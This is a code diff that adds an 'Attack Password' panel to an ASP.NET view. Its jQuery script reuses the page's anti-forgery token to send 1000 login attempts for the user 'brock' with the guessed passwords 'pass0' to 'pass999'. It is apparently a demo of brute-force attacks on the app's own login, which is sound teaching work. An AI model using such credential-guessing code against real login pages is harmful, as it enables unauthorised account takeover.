@@ -53,6 +53,43 @@
         </section>
     </div>
 </div>
+<div class="row">
+    <div class="col-md-4">
+        <h2>Attack Password</h2>
+        <p>
+            This will attempt to brute force the password page.
+        </p>
+        <p><button id="passwordButton" class="btn btn-default">Go</button></p>
+    </div>
+</div>
+
 @section Scripts {
     @Scripts.Render("~/bundles/jqueryval")
+
+<script>
+    $(function () {
+        $("#passwordButton").click(function () {
+            var token = $("input[name=__RequestVerificationToken]").val();
+
+            for (var i = 0; i < 1000; i++) {
+                (function (i) {
+                    var data = {
+                        "__RequestVerificationToken": token,
+                        UserName: "brock",
+                        Password: "pass" + i,
+                        RememberMe: "false"
+                    };
+                    $.ajax({
+                        url: "/Account/Login",
+                        type: "POST",
+                        data: data,
+                        success: function () {
+                            console.log("done: " + data.Password);
+                        }
+                    });
+                })(i);
+            }
+        });
+    });
+</script>
 }
